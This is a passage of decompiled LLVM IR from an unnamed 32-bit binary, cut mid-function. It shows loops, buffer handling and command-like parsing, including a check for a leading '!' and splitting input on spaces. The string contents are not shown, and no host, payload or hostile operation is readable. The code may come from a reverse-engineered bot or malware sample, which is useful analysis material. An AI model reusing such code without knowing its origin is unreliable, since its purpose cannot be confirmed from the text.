  %v4_1000b650 = call i32 @function_1000c264(i32 ptrtoint ([16 x i8]* @global_var_10018dd0.673 to i32), i32 0, i32 268566528)
  %v4_1000b65c = icmp eq i32 %v4_1000b650, -1
  %.19 = select i1 %v4_1000b65c, i32 ptrtoint ([19 x i8]* @global_var_10018df4.677 to i32), i32 ptrtoint ([5 x i8]* @global_var_100170fc.464 to i32)
  store i32 268482180, i32* @lr, align 4
  %v0_1000b680 = call i32 @function_1000c404()
  %v3_1000b688 = icmp eq i32 %v0_1000b680, 0
  br i1 %v3_1000b688, label %dec_label_pc_1000b690, label %dec_label_pc_1000b69c

dec_label_pc_1000b690:                            ; preds = %dec_label_pc_1000b610
  store i32 0, i32* @global_var_1002b8b4.678, align 4
  br label %dec_label_pc_1000b69c

dec_label_pc_1000b69c:                            ; preds = %dec_label_pc_1000b610, %dec_label_pc_1000b690
  store i32 268482208, i32* @lr, align 4
  %v0_1000b69c = call i32 @function_1000b5a0()
  %v2_1000b6ac = load i32, i32* %arg2, align 4
  store i32 %v2_1000b6ac, i32* @r3, align 4
  %v0_1000b6c0 = call i32 @function_1000df60()
  store i32 ptrtoint (i32* @global_var_10018df0.676 to i32), i32* @r4, align 4
  store i32 268482268, i32* @lr, align 4
  %v3_1000b6d8 = call i32 @function_1000e004(i32 %v2_1000b6ac, i32 ptrtoint (i32* @global_var_10018df0.676 to i32), i32 %v0_1000b6c0)
  %v2_1000b6e0 = load i32, i32* %arg2, align 4
  store i32 %v2_1000b6e0, i32* @r3, align 4
  store i32 268482292, i32* @lr, align 4
  %v4_1000b6f0 = load i32, i32* @r6, align 4
  %v5_1000b6f0 = load i32, i32* @r7, align 4
  %v6_1000b6f0 = load i32, i32* @r8, align 4
  %v9_1000b6f0 = call i32 @function_1000c868(i32 %v2_1000b6e0, i32 %.19, i32 %tmp, i32 %v4_1000b6f0, i32 %v5_1000b6f0, i32 %v6_1000b6f0, i32 %tmp, i32 ptrtoint (i32* @0 to i32))
  store i32 ptrtoint ([3 x i8]* @global_var_1000b714.679 to i32), i32* @lr, align 4
  %v6_1000b710 = call i32 @function_1000c5f4(i32 15, i32 %.19, i32 0, i32 0, i32 0)
  store i32 268482332, i32* @lr, align 4
  %v1_1000b718 = call i32 @function_1000c78c(i32 0)
  store i32 268482340, i32* @lr, align 4
  %v0_1000b720 = call i32 @function_1000c44c()
  %v2_1000b728 = xor i32 %v1_1000b718, %v0_1000b720
  store i32 ptrtoint ([3 x i8]* @global_var_1000b734.680 to i32), i32* @lr, align 4
  %v1_1000b730 = call i32 @function_1000f548(i32 %v2_1000b728)
  store i32 268482364, i32* @lr, align 4
  %v1_1000b738 = call i32 @function_1000c78c(i32 0)
  store i32 268482372, i32* @lr, align 4
  %v0_1000b740 = call i32 @function_1000c44c()
  %v2_1000b748 = xor i32 %v1_1000b738, %v0_1000b740
  %v1_1000b750 = call i32 @function_10000380(i32 %v2_1000b748)
  store i32 ptrtoint (i32* @global_var_1000b758.681 to i32), i32* @lr, align 4
  %v1_1000b754 = call i32 @function_1000b2e0(i32 %v1_1000b750)
  store i32 268482396, i32* @lr, align 4
  %v0_1000b758 = call i32 @function_1000c384()
  %v3_1000b768 = icmp eq i32 %v0_1000b758, 0
  br i1 %v3_1000b768, label %dec_label_pc_1000b798, label %dec_label_pc_1000b78c

dec_label_pc_1000b78c:                            ; preds = %dec_label_pc_1000b69c
  %v2_1000b770 = ptrtoint i32* %stack_var_-5256 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_1000b784.682 to i32), i32* @lr, align 4
  %v3_1000b780 = call i32 @function_1000c7d4(i32 %v0_1000b758, i32 %v2_1000b770, i32 0)
  %v0_1000b788 = call i32 @function_1000fc20()
  br label %dec_label_pc_1000b7b8

dec_label_pc_1000b798:                            ; preds = %dec_label_pc_1000b69c
  store i32 268482460, i32* @lr, align 4
  %v0_1000b798 = call i32 @function_1000c384()
  %v3_1000b7a8 = icmp eq i32 %v0_1000b798, 0
  br i1 %v3_1000b7a8, label %dec_label_pc_1000b7b8, label %dec_label_pc_1000b7b0

dec_label_pc_1000b7b0:                            ; preds = %dec_label_pc_1000b798
  %v0_1000b7b4 = call i32 @function_1000fc20()
  br label %dec_label_pc_1000b7b8

dec_label_pc_1000b7b8:                            ; preds = %dec_label_pc_1000b78c, %dec_label_pc_1000b798, %dec_label_pc_1000b7b0
  store i32 268482492, i32* @lr, align 4
  %v0_1000b7b8 = call i32 @function_1000c6cc()
  store i32 ptrtoint ([3 x i8]* @global_var_1000b7c8.685 to i32), i32* @lr, align 4
  %v2_1000b7c4 = call i32 @function_1000c2ac(i32 ptrtoint (i32* @global_var_10018e08.684 to i32), i32 268566528)
  store i32 ptrtoint (i32* @global_var_1000b7d4.686 to i32), i32* @lr, align 4
  %v2_1000b7d0 = call i32 @function_1000ee08(i32 13, i32 1)
  %v2_1000c018 = ptrtoint i32* %stack_var_-4188 to i32
  %v4_1000c028 = bitcast i32* %stack_var_-4188 to i8*
  %v2_1000bb30 = ptrtoint i32* %stack_var_-5320 to i32
  %v1_1000bc40 = or i32 %v2_1000c018, 1
  %v2_1000bdd4 = ptrtoint i32* %stack_var_-5212 to i32
  %v2_1000bfe0 = add i32 %v2_1000bb30, 68
  br label %dec_label_pc_1000b7d8

dec_label_pc_1000b7d8:                            ; preds = %dec_label_pc_1000b7e8, %dec_label_pc_1000c010, %dec_label_pc_1000b7b8
  %v0_1000b7d8 = call i32 @function_1000b13c()
  %v3_1000b7e0 = icmp eq i32 %v0_1000b7d8, 0
  br i1 %v3_1000b7e0, label %dec_label_pc_1000b7f4, label %dec_label_pc_1000b7e8

dec_label_pc_1000b7e8:                            ; preds = %dec_label_pc_1000b7d8
  store i32 268482544, i32* @lr, align 4
  %v1_1000b7ec = call i32 @function_1000fdd8(i32 5)
  br label %dec_label_pc_1000b7d8

dec_label_pc_1000b7f4:                            ; preds = %dec_label_pc_1000b7d8
  %v3_1000b7f8 = load i32, i32* @global_var_1002b8f8.42, align 4
  store i32 %v3_1000b7f8, i32* %r28.global-to-local, align 4
  store i32 268482560, i32* @lr, align 4
  %v0_1000b7fc = call i32 @function_1000b5a0()
  store i32 %v0_1000b7fc, i32* %r27.global-to-local, align 4
  %v3_1000b808 = load i32, i32* @global_var_1002b920.307, align 4
  store i32 %v3_1000b808, i32* %stack_var_-80, align 4
  store i32 268482588, i32* @lr, align 4
  %v3_1000b818 = call i32 @function_1000e7cc(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000b820 = call i32 @function_1000b578()
  %v0_1000b828 = load i32, i32* %r28.global-to-local, align 4
  %v0_1000b834 = load i32, i32* %r27.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000b848.688 to i32), i32* @lr, align 4
  %v7_1000b844 = call i32 @function_100017e4(i32 %v0_1000b828, i32 ptrtoint ([43 x i8]* @global_var_10018e0c.687 to i32), i32 %v0_1000b834)
  br label %dec_label_pc_1000c010

dec_label_pc_1000b868:                            ; preds = %dec_label_pc_1000bb1c, %dec_label_pc_1000bac0
  %v1_1000b86c = mul i32 %storemerge12, 4
  %v3_1000b878 = load i32, i32* @global_var_1002b92c.52, align 4
  %v2_1000b87c = add i32 %v3_1000b878, %v1_1000b86c
  %v1_1000b880 = inttoptr i32 %v2_1000b87c to i32*
  %v2_1000b880 = load i32, i32* %v1_1000b880, align 4
  store i32 268482708, i32* @lr, align 4
  %v3_1000b890 = call i32 @function_1000c7d4(i32 %v2_1000b880, i32 0, i32 1)
  %tmp98 = icmp slt i32 %v3_1000b890, 1
  br i1 %tmp98, label %dec_label_pc_1000bab4, label %dec_label_pc_1000b8f8

dec_label_pc_1000b8b0:                            ; preds = %dec_label_pc_1000b8f8, %dec_label_pc_1000b940
  %v1_1000b8b4 = mul i32 %v1_1000b8a4, 4
  %v3_1000b8c0 = load i32, i32* @global_var_1002b92c.52, align 4
  %v2_1000b8c4 = add i32 %v3_1000b8c0, %v1_1000b8b4
  %v1_1000b8c8 = add i32 %v2_1000b8c4, -4
  %v1_1000b8e4 = inttoptr i32 %v2_1000b8c4 to i32*
  %v2_1000b8e4 = load i32, i32* %v1_1000b8e4, align 4
  %v2_1000b8e8 = inttoptr i32 %v1_1000b8c8 to i32*
  store i32 %v2_1000b8e4, i32* %v2_1000b8e8, align 4
  br label %dec_label_pc_1000b8f8

dec_label_pc_1000b8f8:                            ; preds = %dec_label_pc_1000b868, %dec_label_pc_1000b8b0
  %storemerge21 = phi i32 [ %v1_1000b8a4, %dec_label_pc_1000b8b0 ], [ %storemerge12, %dec_label_pc_1000b868 ]
  %v1_1000b8a4 = add i32 %storemerge21, 1
  %v2_1000b920 = load i32, i32* @global_var_1002b900.50, align 4
  %v3_1000b938 = icmp eq i32 %v2_1000b920, 0
  br i1 %v3_1000b938, label %dec_label_pc_1000b940, label %dec_label_pc_1000b8b0

dec_label_pc_1000b940:                            ; preds = %dec_label_pc_1000b8f8
  %v3_1000b924 = load i32, i32* @global_var_1002b904.51, align 4
  %v3_1000b958 = icmp ugt i32 %v3_1000b924, %v1_1000b8a4
  br i1 %v3_1000b958, label %dec_label_pc_1000b8b0, label %dec_label_pc_1000b960

dec_label_pc_1000b960:                            ; preds = %dec_label_pc_1000b940
  %v1_1000b964 = mul i32 %v1_1000b8a4, 4
  %v3_1000b970 = load i32, i32* @global_var_1002b92c.52, align 4
  %v2_1000b974 = add i32 %v1_1000b964, -4
  %v1_1000b978 = add i32 %v2_1000b974, %v3_1000b970
  %v2_1000b980 = inttoptr i32 %v1_1000b978 to i32*
  store i32 0, i32* %v2_1000b980, align 4
  %v3_1000b98c = load i32, i32* @global_var_1002b904.51, align 4
  %v2_1000b990 = load i32, i32* @global_var_1002b900.50, align 4
  %v1_1000b994 = add i32 %v3_1000b98c, -1
  %v2_1000b994 = icmp ne i32 %v3_1000b98c, 0
  %v2_1000b998 = zext i1 %v2_1000b994 to i32
  %v3_1000b998 = add i32 %v2_1000b990, -1
  %v4_1000b998 = add i32 %v3_1000b998, %v2_1000b998
  store i32 %v4_1000b998, i32* @global_var_1002b900.50, align 4
  store i32 %v1_1000b994, i32* @global_var_1002b904.51, align 4
  %v1_1000b9c8 = mul i32 %v1_1000b994, 4
  %v1_1000b9d0 = add i32 %v1_1000b9c8, 4
  store i32 268483036, i32* @lr, align 4
  %v1_1000b9d8 = call i32 @function_1000ef60(i32 %v1_1000b9d0)
  br label %dec_label_pc_1000ba30

dec_label_pc_1000b9f0:                            ; preds = %dec_label_pc_1000ba30, %dec_label_pc_1000ba78
  %v1_1000b9f4 = mul i32 %storemerge17, 4
  %v2_1000ba00 = add i32 %v1_1000b9f4, %v1_1000b9d8
  %v3_1000ba14 = load i32, i32* @global_var_1002b92c.52, align 4
  %v2_1000ba18 = add i32 %v3_1000ba14, %v1_1000b9f4
  %v1_1000ba1c = inttoptr i32 %v2_1000ba18 to i32*
  %v2_1000ba1c = load i32, i32* %v1_1000ba1c, align 4
  %v2_1000ba20 = inttoptr i32 %v2_1000ba00 to i32*
  store i32 %v2_1000ba1c, i32* %v2_1000ba20, align 4
  %v1_1000ba28 = add i32 %storemerge17, 1
  br label %dec_label_pc_1000ba30

dec_label_pc_1000ba30:                            ; preds = %dec_label_pc_1000b960, %dec_label_pc_1000b9f0
  %storemerge17 = phi i32 [ 0, %dec_label_pc_1000b960 ], [ %v1_1000ba28, %dec_label_pc_1000b9f0 ]
  %v2_1000ba58 = load i32, i32* @global_var_1002b900.50, align 4
  %v3_1000ba70 = icmp eq i32 %v2_1000ba58, 0
  br i1 %v3_1000ba70, label %dec_label_pc_1000ba78, label %dec_label_pc_1000b9f0

dec_label_pc_1000ba78:                            ; preds = %dec_label_pc_1000ba30
  %v3_1000ba5c = load i32, i32* @global_var_1002b904.51, align 4
  %v3_1000ba90 = icmp ugt i32 %v3_1000ba5c, %storemerge17
  br i1 %v3_1000ba90, label %dec_label_pc_1000b9f0, label %dec_label_pc_1000ba98

dec_label_pc_1000ba98:                            ; preds = %dec_label_pc_1000ba78
  %v3_1000ba9c = load i32, i32* @global_var_1002b92c.52, align 4
  store i32 268483240, i32* @lr, align 4
  %v1_1000baa4 = call i32 @function_1000f0b8(i32 %v3_1000ba9c)
  store i32 %v1_1000b9d8, i32* @global_var_1002b92c.52, align 4
  br label %dec_label_pc_1000bab4

dec_label_pc_1000bab4:                            ; preds = %dec_label_pc_1000b868, %dec_label_pc_1000ba98
  %v1_1000bab8 = add i32 %storemerge12, 1
  br label %dec_label_pc_1000bac0

dec_label_pc_1000bac0:                            ; preds = %dec_label_pc_1000c010, %dec_label_pc_1000bab4
  %storemerge12 = phi i32 [ %v1_1000bab8, %dec_label_pc_1000bab4 ], [ 0, %dec_label_pc_1000c010 ]
  %tmp100 = icmp slt i32 %storemerge12, 0
  %v1_1000bac4 = zext i1 %tmp100 to i32
  %v2_1000bac4 = ashr i32 %storemerge12, 31
  %v3_1000bac4 = and i32 %v2_1000bac4, -2
  %v4_1000bac4 = or i32 %v3_1000bac4, %v1_1000bac4
  %v2_1000baec = load i32, i32* @global_var_1002b900.50, align 4
  %v3_1000baf0 = load i32, i32* @global_var_1002b904.51, align 4
  %v3_1000bb04 = icmp ugt i32 %v2_1000baec, %v4_1000bac4
  br i1 %v3_1000bb04, label %dec_label_pc_1000b868, label %dec_label_pc_1000bb0c

dec_label_pc_1000bb0c:                            ; preds = %dec_label_pc_1000bac0
  %v4_1000bb04 = icmp eq i32 %v2_1000baec, %v4_1000bac4
  br i1 %v4_1000bb04, label %dec_label_pc_1000bb1c, label %dec_label_pc_1000bb2c

dec_label_pc_1000bb1c:                            ; preds = %dec_label_pc_1000bb0c
  %v3_1000bb24 = icmp ugt i32 %v3_1000baf0, %storemerge12
  br i1 %v3_1000bb24, label %dec_label_pc_1000b868, label %dec_label_pc_1000bb2c

dec_label_pc_1000bb2c:                            ; preds = %dec_label_pc_1000bb0c, %dec_label_pc_1000bb1c
  %v2_1000bb34 = add i32 %v5_1000c028, %v2_1000bb30
  %v3_1000bb3c = add i32 %v2_1000bb34, 1132
  %v4_1000bb3c = inttoptr i32 %v3_1000bb3c to i8*
  store i8 0, i8* %v4_1000bb3c, align 1
  %v1_1000bb48 = call i32 @function_10000aec(i32 %v2_1000c018)
  store i32 268483424, i32* @lr, align 4
  %v5_1000bb5c = call i32 @function_1000e1b0(i32 %v2_1000c018, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017b38.43, i32 0, i32 0), i32 268500992)
  %v4_1000bb68 = icmp eq i32 %v5_1000bb5c, %v2_1000c018
  br i1 %v4_1000bb68, label %dec_label_pc_1000bb70, label %dec_label_pc_1000bb90

dec_label_pc_1000bb70:                            ; preds = %dec_label_pc_1000bb2c
  %v3_1000bb74 = load i32, i32* @global_var_1002b8f8.42, align 4
  store i32 ptrtoint (i32* @global_var_1000bb8c.690 to i32), i32* @lr, align 4
  %v4_1000bb88 = call i32 @function_100017e4(i32 %v3_1000bb74, i32 ptrtoint ([5 x i8]* @global_var_10018e38.689 to i32), i32 268566528)
  br label %dec_label_pc_1000c010

dec_label_pc_1000bb90:                            ; preds = %dec_label_pc_1000bb2c
  store i32 268483492, i32* @lr, align 4
  %v5_1000bba0 = call i32 @function_1000e1b0(i32 %v2_1000c018, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018e40.691, i32 0, i32 0), i32 268566528)
  %v4_1000bbac = icmp eq i32 %v5_1000bba0, %v2_1000c018
  br i1 %v4_1000bbac, label %dec_label_pc_1000bbb4, label %dec_label_pc_1000bbbc

dec_label_pc_1000bbb4:                            ; preds = %dec_label_pc_1000bb90
  %v0_1000bbb8 = call i32 @function_1000fc20()
  br label %dec_label_pc_1000bbbc

dec_label_pc_1000bbbc:                            ; preds = %dec_label_pc_1000bb90, %dec_label_pc_1000bbb4
  %v2_1000bbc8 = load i8, i8* %v4_1000c028, align 4
  %v3_1000bbd0 = icmp eq i8 %v2_1000bbc8, 33
  br i1 %v3_1000bbd0, label %dec_label_pc_1000bbf4, label %dec_label_pc_1000c010

dec_label_pc_1000bbf4:                            ; preds = %dec_label_pc_1000bbbc, %dec_label_pc_1000bc08
  %storemerge = phi i32 [ %v1_1000bbdc, %dec_label_pc_1000bc08 ], [ %v2_1000c018, %dec_label_pc_1000bbbc ]
  %v1_1000bbdc = add i32 %storemerge, 1
  %storemerge6 = inttoptr i32 %v1_1000bbdc to i8*
  %v2_1000bbf8 = load i8, i8* %storemerge6, align 1
  %v3_1000bc00 = icmp eq i8 %v2_1000bbf8, 32
  br i1 %v3_1000bc00, label %dec_label_pc_1000bc1c, label %dec_label_pc_1000bc08

dec_label_pc_1000bc08:                            ; preds = %dec_label_pc_1000bbf4
  %v2_1000bc0c = load i8, i8* %storemerge6, align 1
  %v3_1000bc14 = icmp eq i8 %v2_1000bc0c, 0
  br i1 %v3_1000bc14, label %dec_label_pc_1000bc1c, label %dec_label_pc_1000bbf4

dec_label_pc_1000bc1c:                            ; preds = %dec_label_pc_1000bc08, %dec_label_pc_1000bbf4
  %v2_1000bc20 = load i8, i8* %storemerge6, align 1
  %v3_1000bc28 = icmp eq i8 %v2_1000bc20, 0
  br i1 %v3_1000bc28, label %dec_label_pc_1000c010, label %dec_label_pc_1000bc30

dec_label_pc_1000bc30:                            ; preds = %dec_label_pc_1000bc1c
  store i8 0, i8* %storemerge6, align 1
  store i32 %v1_1000bc40, i32* @r3, align 4
  %v0_1000bc50 = call i32 @function_1000df60()
  %v2_1000bc60 = add i32 %v0_1000bc50, %v2_1000c018
  %v1_1000bc64 = add i32 %v2_1000bc60, 2
  %v2_1000bcb0 = add i32 %v2_1000bc60, 1
  br label %dec_label_pc_1000bc98

dec_label_pc_1000bc70:                            ; preds = %dec_label_pc_1000bcc8, %dec_label_pc_1000bc98
  store i32 %v1_1000bc64, i32* @r3, align 4
  %v0_1000bc78 = call i32 @function_1000df60()
  %v1_1000bc8c = add i32 %v0_1000bc78, %v2_1000bcb0
  %v3_1000bc94 = inttoptr i32 %v1_1000bc8c to i8*
  store i8 0, i8* %v3_1000bc94, align 1
  br label %dec_label_pc_1000bc98

dec_label_pc_1000bc98:                            ; preds = %dec_label_pc_1000bc30, %dec_label_pc_1000bc70
  store i32 %v1_1000bc64, i32* @r3, align 4
  %v0_1000bca0 = call i32 @function_1000df60()
  %v1_1000bcb4 = add i32 %v0_1000bca0, %v2_1000bcb0
  %v1_1000bcb8 = inttoptr i32 %v1_1000bcb4 to i8*
  %v2_1000bcb8 = load i8, i8* %v1_1000bcb8, align 1
  %v3_1000bcc0 = icmp eq i8 %v2_1000bcb8, 10
  br i1 %v3_1000bcc0, label %dec_label_pc_1000bc70, label %dec_label_pc_1000bcc8

dec_label_pc_1000bcc8:                            ; preds = %dec_label_pc_1000bc98
  store i32 %v1_1000bc64, i32* @r3, align 4
  %v0_1000bcd0 = call i32 @function_1000df60()
  %v1_1000bce4 = add i32 %v0_1000bcd0, %v2_1000bcb0
  %v1_1000bce8 = inttoptr i32 %v1_1000bce4 to i8*
  %v2_1000bce8 = load i8, i8* %v1_1000bce8, align 1
  %v3_1000bcf0 = icmp eq i8 %v2_1000bce8, 13
  br i1 %v3_1000bcf0, label %dec_label_pc_1000bc70, label %dec_label_pc_1000bd10.preheader

dec_label_pc_1000bd10.preheader:                  ; preds = %dec_label_pc_1000bcc8
  %stack_var_-5284.023 = inttoptr i32 %v1_1000bc64 to i8*
  %v2_1000bd1424 = load i8, i8* %stack_var_-5284.023, align 1
  %v3_1000bd1c28 = icmp eq i8 %v2_1000bd1424, 32
  br i1 %v3_1000bd1c28, label %dec_label_pc_1000bd38, label %dec_label_pc_1000bd24

dec_label_pc_1000bd04:                            ; preds = %dec_label_pc_1000bd24
  %v1_1000bd08 = add i32 %storemerge2229, 1
  %stack_var_-5284.0 = inttoptr i32 %v1_1000bd08 to i8*
  %v2_1000bd14 = load i8, i8* %stack_var_-5284.0, align 1
  %v3_1000bd1c = icmp eq i8 %v2_1000bd14, 32
  br i1 %v3_1000bd1c, label %dec_label_pc_1000bd38, label %dec_label_pc_1000bd24

dec_label_pc_1000bd24:                            ; preds = %dec_label_pc_1000bd10.preheader, %dec_label_pc_1000bd04
  %stack_var_-5284.030 = phi i8* [ %stack_var_-5284.0, %dec_label_pc_1000bd04 ], [ %stack_var_-5284.023, %dec_label_pc_1000bd10.preheader ]
  %storemerge2229 = phi i32 [ %v1_1000bd08, %dec_label_pc_1000bd04 ], [ %v1_1000bc64, %dec_label_pc_1000bd10.preheader ]
  %v2_1000bd28 = load i8, i8* %stack_var_-5284.030, align 1
  %v3_1000bd30 = icmp eq i8 %v2_1000bd28, 0
  br i1 %v3_1000bd30, label %dec_label_pc_1000bd38, label %dec_label_pc_1000bd04

dec_label_pc_1000bd38:                            ; preds = %dec_label_pc_1000bd04, %dec_label_pc_1000bd24, %dec_label_pc_1000bd10.preheader
  %storemerge22.lcssa = phi i32 [ %v1_1000bc64, %dec_label_pc_1000bd10.preheader ], [ %v1_1000bd08, %dec_label_pc_1000bd04 ], [ %storemerge2229, %dec_label_pc_1000bd24 ]
  %stack_var_-5284.0.lcssa = phi i8* [ %stack_var_-5284.023, %dec_label_pc_1000bd10.preheader ], [ %stack_var_-5284.0, %dec_label_pc_1000bd04 ], [ %stack_var_-5284.030, %dec_label_pc_1000bd24 ]
  store i8 0, i8* %stack_var_-5284.0.lcssa, align 1
  %v1_1000bd48 = add i32 %storemerge22.lcssa, 1
  %v2_1000bd9435 = load i8, i8* %stack_var_-5284.023, align 1
  %v3_1000bd9c38 = icmp eq i8 %v2_1000bd9435, 0
  br i1 %v3_1000bd9c38, label %dec_label_pc_1000bda4, label %dec_label_pc_1000bd5c

dec_label_pc_1000bd5c:                            ; preds = %dec_label_pc_1000bd38, %dec_label_pc_1000bd5c
  %storemerge540 = phi i8* [ %storemerge5, %dec_label_pc_1000bd5c ], [ %stack_var_-5284.023, %dec_label_pc_1000bd38 ]
  %storemerge1439 = phi i32 [ %v1_1000bd88, %dec_label_pc_1000bd5c ], [ %v1_1000bc64, %dec_label_pc_1000bd38 ]
  %v3_1000bd60 = load i8, i8* %storemerge540, align 1
  %v4_1000bd60 = zext i8 %v3_1000bd60 to i32
  store i32 268483956, i32* @lr, align 4
  %v3_1000bd70 = call i32 @function_1000c83c(i32 %v4_1000bd60, i32 %storemerge1439)
  %v1_1000bd80 = trunc i32 %v3_1000bd70 to i8
  store i8 %v1_1000bd80, i8* %storemerge540, align 1
  %v1_1000bd88 = add i32 %storemerge1439, 1
  %storemerge5 = inttoptr i32 %v1_1000bd88 to i8*
  %v2_1000bd94 = load i8, i8* %storemerge5, align 1
  %v3_1000bd9c = icmp eq i8 %v2_1000bd94, 0
  br i1 %v3_1000bd9c, label %dec_label_pc_1000bda4, label %dec_label_pc_1000bd5c

dec_label_pc_1000bda4:                            ; preds = %dec_label_pc_1000bd5c, %dec_label_pc_1000bd38
  store i32 ptrtoint ([5 x i8]* @global_var_10018e44.692 to i32), i32* @r4, align 4
  %v4_1000bdb4 = call i32 @function_1000df0c(i8* %stack_var_-5284.023, i32 ptrtoint ([5 x i8]* @global_var_10018e44.692 to i32))
  %v3_1000bdbc = icmp eq i32 %v4_1000bdb4, 0
  br i1 %v3_1000bdbc, label %dec_label_pc_1000bdc4, label %dec_label_pc_1000be8c

dec_label_pc_1000bdc4:                            ; preds = %dec_label_pc_1000bda4
  store i32 268484040, i32* @lr, align 4
  %v0_1000bdc4 = call i32 @function_10002bfc()
  %v3_1000bdcc = icmp eq i32 %v0_1000bdc4, 0
  br i1 %v3_1000bdcc, label %dec_label_pc_1000bdd4, label %dec_label_pc_1000c010

dec_label_pc_1000bdd4:                            ; preds = %dec_label_pc_1000bdc4
  store i32 268484076, i32* @lr, align 4
  %v3_1000bde8 = call i32 @function_1000dd4c(i32 %v2_1000bdd4, i32 0, i32 1024)
  %v4_1000be08 = call i32 @function_10001734(i32 %v2_1000bdd4, i32 ptrtoint ([8 x i8]* @global_var_10018e4c.693 to i32), i32 %v1_1000bd48)
  store i32 268484132, i32* @lr, align 4
  %v3_1000be20 = call i32 @function_10001918(i32 %v2_1000bdd4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_10018e54.694, i32 0, i32 0))
  br label %dec_label_pc_1000be5c

dec_label_pc_1000be30:                            ; preds = %dec_label_pc_1000be5c
  %v1_1000be38 = call i32 @function_10000aec(i32 %v2_1000bdd4)
  store i32 ptrtoint ([3 x i8]* @global_var_1000be54.695 to i32), i32* @lr, align 4
  %v3_1000be50 = call i32 @function_1000dd4c(i32 %v2_1000bdd4, i32 0, i32 1024)
  store i32 268484188, i32* @lr, align 4
  %v1_1000be58 = call i32 @function_1000fdd8(i32 1)
  br label %dec_label_pc_1000be5c

dec_label_pc_1000be5c:                            ; preds = %dec_label_pc_1000bdd4, %dec_label_pc_1000be30
  %v3_1000be6c = call i32 @function_10001d64(i32 %v2_1000bdd4, i32 1024, i32 %v3_1000be20)
  %v3_1000be74 = icmp eq i32 %v3_1000be6c, 0
  br i1 %v3_1000be74, label %dec_label_pc_1000be7c, label %dec_label_pc_1000be30

dec_label_pc_1000be7c:                            ; preds = %dec_label_pc_1000be5c
  %v1_1000be80 = call i32 @function_10001bc4(i32 %v3_1000be20)
  %v0_1000be88 = call i32 @function_1000fc20()
  br label %dec_label_pc_1000be8c

dec_label_pc_1000be8c:                            ; preds = %dec_label_pc_1000bda4, %dec_label_pc_1000be7c
  store i32 ptrtoint (i32* @global_var_10018e58.698 to i32), i32* @r4, align 4
  store i32 268484264, i32* @lr, align 4
  %v3_1000bea4 = call i32 @function_1000e454(i32 %v1_1000bd48, i32 ptrtoint (i32* @global_var_10018e58.698 to i32), i32 268566528)
  store i32 %v1_1000bc64, i32* %stack_var_-5252, align 4
  %v3_1000bf9c44 = icmp eq i32 %v3_1000bea4, 0
  br i1 %v3_1000bf9c44, label %dec_label_pc_1000bfa4, label %dec_label_pc_1000bebc

dec_label_pc_1000bebc:                            ; preds = %dec_label_pc_1000be8c, %dec_label_pc_1000bf80
  %stack_var_-5312.047.in = phi i32 [ %v3_1000bf8c, %dec_label_pc_1000bf80 ], [ %v3_1000bea4, %dec_label_pc_1000be8c ]
  %stack_var_-5308.145 = phi i32 [ %stack_var_-5308.0, %dec_label_pc_1000bf80 ], [ 1, %dec_label_pc_1000be8c ]
  %stack_var_-5312.047 = inttoptr i32 %stack_var_-5312.047.in to i8*
  %v2_1000bec0 = load i8, i8* %stack_var_-5312.047, align 1
  %v3_1000bec8 = icmp eq i8 %v2_1000bec0, 10
  br i1 %v3_1000bec8, label %dec_label_pc_1000bf80, label %dec_label_pc_1000bed0

dec_label_pc_1000bed0:                            ; preds = %dec_label_pc_1000bebc
  store i32 %stack_var_-5308.145, i32* @r29, align 4
  store i32 %stack_var_-5312.047.in, i32* @r3, align 4
  %v0_1000bedc = call i32 @function_1000df60()
  %v1_1000bee4 = add i32 %v0_1000bedc, 1
  store i32 268484336, i32* @lr, align 4
  %v1_1000beec = call i32 @function_1000ef60(i32 %v1_1000bee4)
  %v0_1000bef8 = load i32, i32* @r29, align 4
  %v1_1000bef8 = mul i32 %v0_1000bef8, 4
  %v1_1000bf04 = add i32 %v1_1000bef8, %v2_1000bfe0
  %v2_1000bf08 = inttoptr i32 %v1_1000bf04 to i32*
  store i32 %v1_1000beec, i32* %v2_1000bf08, align 4
  %v1_1000bf10 = mul i32 %stack_var_-5308.145, 4
  %v1_1000bf1c = add i32 %v1_1000bf10, %v2_1000bfe0
  %v1_1000bf20 = inttoptr i32 %v1_1000bf1c to i32*
  %v2_1000bf20 = load i32, i32* %v1_1000bf20, align 4
  store i32 %stack_var_-5312.047.in, i32* @r3, align 4
  %v0_1000bf2c = call i32 @function_1000df60()
  %v1_1000bf34 = add i32 %v0_1000bf2c, 1
  store i32 268484428, i32* @lr, align 4
  %v3_1000bf48 = call i32 @function_1000dd4c(i32 %v2_1000bf20, i32 0, i32 %v1_1000bf34)
  %v2_1000bf60 = load i32, i32* %v1_1000bf20, align 4
  %v4_1000bf70 = call i32 @function_1000df40(i32 %v2_1000bf60, i8* nonnull %stack_var_-5312.047)
  %v1_1000bf78 = add i32 %stack_var_-5308.145, 1
  br label %dec_label_pc_1000bf80

dec_label_pc_1000bf80:                            ; preds = %dec_label_pc_1000bebc, %dec_label_pc_1000bed0
  %stack_var_-5308.0 = phi i32 [ %stack_var_-5308.145, %dec_label_pc_1000bebc ], [ %v1_1000bf78, %dec_label_pc_1000bed0 ]
  store i32 ptrtoint (i32* @global_var_10018e58.698 to i32), i32* @r4, align 4
  store i32 268484496, i32* @lr, align 4
  %v3_1000bf8c = call i32 @function_1000e454(i32 0, i32 ptrtoint (i32* @global_var_10018e58.698 to i32), i32 268566528)
  %v3_1000bf9c = icmp eq i32 %v3_1000bf8c, 0
  br i1 %v3_1000bf9c, label %dec_label_pc_1000bfa4, label %dec_label_pc_1000bebc

dec_label_pc_1000bfa4:                            ; preds = %dec_label_pc_1000bf80, %dec_label_pc_1000be8c
  %stack_var_-5308.1.lcssa = phi i32 [ 1, %dec_label_pc_1000be8c ], [ %stack_var_-5308.0, %dec_label_pc_1000bf80 ]
  store i32 268484532, i32* @lr, align 4
  %v3_1000bfb0 = call i32 @function_1000a77c(i32 %stack_var_-5308.1.lcssa, i32* nonnull %stack_var_-5252)
  %tmp99 = icmp slt i32 %stack_var_-5308.1.lcssa, 2
  br i1 %tmp99, label %dec_label_pc_1000c010, label %dec_label_pc_1000bfd4.lr.ph

dec_label_pc_1000bfd4.lr.ph:                      ; preds = %dec_label_pc_1000bfa4
  store i32 1, i32* %stack_var_-5320, align 4
  br label %dec_label_pc_1000bfd4

